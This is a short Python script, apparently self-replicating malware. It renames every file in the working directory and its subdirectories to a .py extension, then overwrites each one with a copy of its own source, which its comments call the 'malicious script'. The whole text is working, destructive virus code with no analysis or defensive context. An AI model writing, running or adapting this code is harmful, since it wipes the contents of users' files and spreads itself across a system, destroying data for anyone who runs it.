import os
import sys

class GeneralData:
    files = []
    directories = []

# Function for convert files to Python files
def ConvertFiles():
    for i in os.listdir(os.getcwd()):
        if '.' in i:
            try:
                os.rename(os.getcwd() + '/' + '{}'.format(i) , os.getcwd() + "/" + '{}.py'.format(i.split('.')[0]))
            except:
                continue
        else:
            GeneralData.directories.append(i)

# Find files in current directory and convert files to Python files
def FindAndConvert():
    for i in os.listdir(os.getcwd()):
        if os.path.isfile(i):
            GeneralData.files.append(i)

    ConvertFiles()

    for i in GeneralData.directories:
        os.chdir(os.getcwd() + '\\' + i)
        ConvertFiles()
    
# Checking for is it changed already or not
def ReadFileContent(files):
    for file in files:
        try:
            with open(file , mode= 'r') as f:
                if f.read() == InfectedFileContent():
                    continue
                else:
                    ContentChanger(file)        
        except:
            continue

# Copy content of this script
def InfectedFileContent():
    with open(sys.argv[0] , mode='r') as f:
        maliciousContent = f.read()
    return maliciousContent

# Write malicious script to files
def ContentChanger(file):
    with open(file , mode= 'w') as f:
        f.write(InfectedFileContent())

def MainScript():
    ConvertFiles()
    FindAndConvert()
    ReadFileContent(GeneralData.files)

MainScript()
